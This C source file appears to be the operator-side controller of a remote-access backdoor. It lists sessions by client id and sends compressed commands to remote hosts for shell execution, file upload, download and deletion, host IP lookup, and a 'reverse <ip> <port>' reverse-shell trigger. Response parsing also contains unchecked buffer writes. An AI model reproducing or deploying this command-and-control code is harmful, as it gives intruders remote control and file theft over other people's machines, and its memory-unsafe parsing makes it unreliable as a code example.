#include <stdio.h>
#include <stdlib.h>
#include "../include/util.h"
#include <unistd.h>
#include "app.h"
#include "../include/udp.h"
#include "../include/cmd.h"
#include <string.h>
#include <pthread.h>
#include <ctype.h>
#include "zlib.h"
#include "session.h"
#include <arpa/inet.h>

/*
    process_getuid, //SERVER_CMD_GETUID
    process_upload, //SERVER_CMD_UPLOAD
    process_download,//SERVER_CMD_DOWNLOAD
    process_shellcmd,//SERVER_CMD_SHELL
    process_move,//SERVER_CMD_MOVE
    process_mkdir,//SERVER_CMD_MKDIR
    process_del_dir,//SERVER_CMD_DELDIR
    process_rename,//SERVER_CMD_RENAME
    process_list,//SERVER_CMD_LIST
    process_del_file,//SERVER_CMD_DELFILE
    process_chdir, //SERVER_CMD_CHDIR
    process_getcwd,//SERVER_CMD_GETCWD
    SERVER_CMD_GETOUTERIP
*/

static struct
{
    const char * cmd;
    const char * argv[5];
}g_cmdUsageTable[] = {
    {"session", {"<list|clientid>", 0, 0, 0, 0}},
    {"getuid", {0, 0, 0, 0, 0}},
    {"upload", {"<local>", "<remote>", 0, 0, 0}},
    {"download", {"<remote>", "<local>", 0, 0, 0}},
    {"bash", {"<shell cmd>", 0, 0, 0, 0}},
    {"move", {"<src>", "<dst>", 0, 0, 0}},
    {"mkdir", {"<dir>", 0, 0, 0, 0}},
    {"rmdir", {"<dir>", 0, 0, 0, 0}},
    {"rename", {"<old>", "<new>", 0, 0, 0}},
    {"list", {0, 0, 0, 0, 0}},
    {"rm", {"<file>", 0, 0, 0, 0}},
    {"cd", {"<dir>", 0, 0, 0, 0}},
    {"pwd", {0, 0, 0, 0, 0}},
    {"hostip", {0, 0, 0, 0, 0}},
    {"reverse", {"<ip>", "<port>", 0, 0, 0}},
};

//-1 没有命令
int findCmd(const char * cmd, int * argc)
{
    for (int i = 0; i < sizeof(g_cmdUsageTable)/sizeof(g_cmdUsageTable[0]); i++)
    {
        if (strcmp(g_cmdUsageTable[i].cmd, cmd) == 0)
        {
            int count = 0;
            for (int j = 0; j < sizeof(g_cmdUsageTable[i].argv)/sizeof(char *) && g_cmdUsageTable[i].argv[j]; j++)
            {
                ++ count;
            }
            *argc = count;
            return i;
        }
    }
    return -1;
}

void usage()
{
    for (int i = 0; i < sizeof(g_cmdUsageTable)/sizeof(g_cmdUsageTable[0]); i++)
    {
        printf("%s", g_cmdUsageTable[i].cmd);
        for (int j = 0; j < sizeof(g_cmdUsageTable[i].argv)/sizeof(char *) && g_cmdUsageTable[i].argv[j]; j++)
        {
            printf(" %s", g_cmdUsageTable[i].argv[j]);
        }
        printf("\n");
    }
}

void help(int code)
{
    printf("Usage: %s", g_cmdUsageTable[code].cmd);
    for (int j = 0; j < sizeof(g_cmdUsageTable[code].argv)/sizeof(char *) && g_cmdUsageTable[code].argv[j]; j++)
    {
        printf(" %s", g_cmdUsageTable[code].argv[j]);
    }
    printf("\n");
}

int parseCmdLine(char * cmdline, const char *argv[])
{
    int argc = 0;
    int findWord = 0;
    for (int i = 0; cmdline[i] != 0; i++)
    {
        if (cmdline[i] != ' ' && cmdline[i] != '\n')
        {
        	if(findWord == 0)
        	{
        		argv[argc++] = &cmdline[i];
			}
            findWord = 1;
        }
        else
        {
            cmdline[i] = 0;
            findWord = 0;
        }
    }
    return argc;
}

int buildCmdReq(unsigned char code, const char *argv[], int argc, char * out, int maxSize)
{
    struct CmdReq * cmd = (struct CmdReq *)out;
    cmd->code = code;
    getRand(&cmd->sid, 2);
    char * p = cmd->data;
    int offset = 0;
    if (code == SERVER_CMD_SHELL)
    {
        //将所有参数组合成一个参数
        for (int i = 1; i < argc; i++)
        {
            for (int j = 0; argv[i][j]; j++)
            {
                p[offset++] = argv[i][j];
            }
            p[offset++] = ' ';
        }
        p[offset-1] = 0;
    }
    else if (code == SERVER_CMD_UPLOAD)
    {
        //因为输入参数与输出实际是同一个缓冲,因此要将名字先复制出来
        char localFile[255], remoteFile[255];
        strcpy_s(localFile, sizeof(localFile), argv[1]);
        int fileNameLen = strcpy_s(remoteFile, sizeof(remoteFile), argv[2]);

        memcpy_s(p, maxSize - sizeof(*cmd), remoteFile, fileNameLen);
        offset += fileNameLen;

        unsigned long plainLen = 65536;
        char * plainData = (char *)malloc(plainLen);
        int fileSize = readFile(localFile, plainData, plainLen);
        if (fileSize < 0)
        {
            perror("Local error");
            free(plainData);
            return -1;
        }
        else if(fileSize == 0)
        {
            printf("Local error: file size exceed 64K\n");
            free(plainData);
            return -1;
        }

        unsigned long compressedLen = maxSize - sizeof(*cmd) - offset;
        int ret = compress2((Bytef *)(p + offset), &compressedLen, (const Bytef *)plainData, fileSize, 9);
        if (ret != Z_OK)
        {
            printf("compress2 %d\n", ret);
            free(plainData);
            return -1;
        }

        if (compressedLen > 430)//最大字节数
        {
            printf("Local error: file size(%lu) after compress exceed 430\n", compressedLen);
            free(plainData);
            return -1;
        }
                
        free(plainData);
        offset += compressedLen;
    }
    else
    {
        for (int i = 1; i < argc; i++)
        {
            int len = strlen(argv[i]) + 1;
            memcpy_s(p + offset, maxSize - offset - sizeof(*cmd), argv[i], len);
            offset += len;
        }
    }
    
    cmd->datalen = htons(offset);
    return offset + sizeof(*cmd);
}

/*
    返回一个用于屏幕显示的字符串指针
*/
char * parseCmdRsp(const struct CmdReq * req, const char * data, int len)
{
    struct CmdRsp * rsp = (struct CmdRsp *)data;
    unsigned int datalen = ntohl(rsp->datalen);
    if (datalen > len)
    {
        printf("\nRecv CmdRsp length error\n");
        return 0;
    }

    char * msg = (char *)malloc(255);
    memset(msg, 0, 255);

    if (rsp->errNo == CUSTOM_ERRNO)
    {
        rsp->data[datalen] = 0;
        snprintf(msg, 255, "Remote error: %s.\n", rsp->data);
    }
    else if(rsp->errNo != 0)
    {
        const char * errMsg = strerror(rsp->errNo);
        snprintf(msg, 255, "Remote error: %s.\n", errMsg);
    }
    else
    {
        if (rsp->flag == 1)
        {
            unsigned long plainLen = datalen*10;
            char * plain = (char *)malloc(plainLen + 1);
            int ret = uncompress((Bytef *)plain, &plainLen, (const Bytef *)rsp->data, datalen);
            if (ret == Z_OK)
            {
                if (req->code == SERVER_CMD_DOWNLOAD) //传输的是文件数据
                {
                    const char * remoteName = (char *)(req + 1);
                    const char * localName = remoteName + strlen(remoteName) + 1;
                    int ret = writeFile(localName, plain, plainLen);
                    if (ret < 0)
                    {
                        perror("\nwriteFile");
                    }
                    else
                    {
                        snprintf(msg, 255, "Download remote %s to %s success\n", remoteName, localName);
                    }
                }
                else
                {
                    plain[plainLen] = 0;
                    free(msg);
                    msg = (char *)malloc(plainLen + 10);
                    snprintf(msg, plainLen + 10, "\n%s\n", plain);
                }
            }
            else
            {
                snprintf(msg, 255, "uncompress %d, rsplen %d\n", ret, datalen);
            }
            free(plain);
        }
        else
        {
            if (req->code == SERVER_CMD_GETOUTERIP)
            {
                unsigned int * ip = (unsigned int *)(rsp->data);
                struct in_addr addr;
                addr.s_addr = ntohl(*ip);
                char * ipv4 = inet_ntoa(addr);
                char * hostname = (char *)(ip + 1);
                rsp->data[datalen] = 0;
                snprintf(msg, 255, "hostname:%s,ip:%s\n", hostname, ipv4);
            }
            else
            {
                rsp->data[datalen] = 0;
                free(msg);
                msg = (char *)malloc(datalen + 10);
                snprintf(msg, datalen + 10, "%s\n", rsp->data);
            }
        }
    }

    return msg;
}



